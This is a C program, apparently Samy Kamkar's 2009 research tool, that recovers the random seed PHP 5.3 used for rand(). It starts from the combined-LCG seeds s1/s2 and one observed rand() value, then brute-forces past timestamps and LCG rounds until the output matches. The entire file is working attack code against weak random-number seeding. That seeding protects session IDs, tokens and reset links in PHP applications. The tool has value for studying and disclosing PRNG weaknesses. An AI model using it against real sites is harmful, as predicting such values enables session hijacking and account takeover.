/*
 * This program will produce the seed used for srand() [or similar]
 * for PHP 5.3 given the s1 and s2 (initial seeds) of the LCG and
 * a random number from rand().
 *
 * You may want to adjust lcg_calls() and rand_calls() if you think
 * the random number you have was seeded after many php_combined_lcg()s
 * (which contains session_start(), uniqid(), and lcg_value()) or
 * after many rand()s. 
 *
 * Also, if you know the time that rand was seeded, set `sec` to it.
 *
 * To get s1/s2, see s1s2.c.
 *
 * -samy kamkar, code@samy.pl, 08/25/09
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <math.h>

/*
 * combinedLCG() returns a pseudo random number in the range of (0, 1).
 * The function combines two CGs with periods of
 * 2^31 - 85 and 2^31 - 249. The period of this function
 * is equal to the product of both primes.
 */

int q, z;
#define MODMULT(a, b, c, m, s) q = s/a;s=b*(s-a*q)-c*q;if(s<0)s+=m

double combined_lcg(int s1, int s2)
{
	z = s1 - s2;
	if (z < 1)
		z += 2147483562;

	return z * 4.656613e-10;
}

int main(int argc, char** argv)
{	
	if (argc != 4)
	{
		fprintf(stderr, "usage: %s <s1> <s2> <rand() value>\n", argv[0]);
		return -1;
	}

	int s1 = atoi(argv[1]);
	int s2 = atoi(argv[2]);
	long rand = atol(argv[3]);
	int pid = s2;
	struct timeval tv;
	int i, j;
	int rand_calls = 3;
	int lcg_calls = 10;
	long lcg[lcg_calls+1];
	long seed;

	/* create our lcg array */
	for (i = 0; i < lcg_calls; i++)
	{
		/* set first round of s1/s2 */
		MODMULT(53668, 40014, 12211, 2147483563L, s1);
		MODMULT(52774, 40692, 3791,  2147483399L, s2);

		lcg[i] = (long) (1000000.0 * combined_lcg(s1, s2));
	}

	/* get our time, we'll brute force seconds in reverse */
	gettimeofday(&tv, NULL);
	int sec = tv.tv_sec;

	/* brute force seconds */
	int rounds = 0;
	while (sec--)
	{
		if (rounds++ % 1000 == 0)
			printf("Testing second round %d...\n", rounds);

		for (j = 0; j < lcg_calls; j++)
		{
			seed = (((long) (sec * pid)) ^ lcg[j]);
			srandom(seed);

			for (i = 0; i < rand_calls; i++)
			{
				if (random() == rand)
				{
					printf("seed=%Ld sec=%d lcg_round=%d srand_round=%d\n", seed, sec, j, i);
					return 0;
				}
			}
		}
	}

	return 0;
}

